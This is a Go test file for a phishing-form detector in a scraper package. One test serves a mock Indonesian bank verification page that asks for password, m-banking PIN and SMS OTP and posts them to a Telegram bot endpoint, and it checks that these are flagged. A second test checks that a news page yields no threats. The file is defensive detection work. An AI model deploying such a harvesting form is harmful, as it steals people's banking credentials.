package scraper

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func TestInspectFormThreats_CredentialHarvesting(t *testing.T) {
	mockHTML := `
	<!DOCTYPE html>
	<html>
	<head><title>Verifikasi Akun Bank</title></head>
	<body>
		<h2>Pembaruan Keamanan</h2>
		<form action="https://api.telegram.org/bot12345/sendMessage" method="POST">
			<label>User ID</label>
			<input type="text" name="userid" />
			<label>Password</label>
			<input type="password" name="password" />
			<label>PIN m-Banking</label>
			<input type="password" name="pin" />
			<label>Kode OTP SMS</label>
			<input type="text" name="otp" />
			<button type="submit">Konfirmasi Sekarang</button>
		</form>
	</body>
	</html>
	`

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write([]byte(mockHTML))
	}))
	defer server.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	threats, title, err := InspectFormThreatsWithClient(ctx, server.URL, server.Client())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if title != "Verifikasi Akun Bank" {
		t.Errorf("expected title 'Verifikasi Akun Bank', got '%s'", title)
	}

	if len(threats) == 0 {
		t.Fatalf("expected threats to be detected, got 0")
	}

	foundPassword := false
	foundPINOrOTP := false
	foundTelegramExfil := false

	for _, threat := range threats {
		threatLower := strings.ToLower(threat)
		if strings.Contains(threatLower, "password") || strings.Contains(threatLower, "sandi") {
			foundPassword = true
		}
		if strings.Contains(threatLower, "pin") || strings.Contains(threatLower, "otp") {
			foundPINOrOTP = true
		}
		if strings.Contains(threatLower, "telegram") || strings.Contains(threatLower, "eksternal") {
			foundTelegramExfil = true
		}
	}

	if !foundPassword {
		t.Errorf("expected password threat indicator")
	}
	if !foundPINOrOTP {
		t.Errorf("expected PIN/OTP threat indicator")
	}
	if !foundTelegramExfil {
		t.Errorf("expected telegram exfiltration threat indicator")
	}
}

func TestInspectFormThreats_SafeArticleNoForms(t *testing.T) {
	mockHTML := `
	<!DOCTYPE html>
	<html>
	<head><title>Berita Terkini</title></head>
	<body>
		<h1>Presiden Resmikan Jembatan Baru</h1>
		<p>Pembangunan jembatan ini telah selesai tepat waktu.</p>
	</body>
	</html>
	`

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write([]byte(mockHTML))
	}))
	defer server.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	threats, title, err := InspectFormThreatsWithClient(ctx, server.URL, server.Client())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if title != "Berita Terkini" {
		t.Errorf("expected title 'Berita Terkini', got '%s'", title)
	}

	if len(threats) != 0 {
		t.Errorf("expected 0 threats for safe article, got %v", threats)
	}
}
